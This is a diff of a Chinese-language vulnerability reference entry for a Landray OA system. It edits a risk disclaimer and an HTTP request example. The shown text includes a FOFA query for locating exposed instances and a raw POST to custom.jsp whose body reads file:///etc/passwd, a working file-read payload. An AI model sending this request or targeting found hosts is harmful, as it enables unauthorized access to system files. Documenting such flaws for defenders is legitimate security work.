@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -72,13 +72,14 @@ FOFA:  app="Landray-OA系统"
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+Content-Length: 42
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
 
 var={"body":{"file":"file:///etc/passwd"\}\}
 ```
 
-> 请求长度说明：原资料 Content-Length 为 42；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 42；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UGicsjEf95CAW6nYx9fytsIIwlib5jbcTwsHbwv6bafvbQ0aib8bcrCX6memWRmAsZjZ3qs9eFCnEQ/640?wx_fmt=png)
 
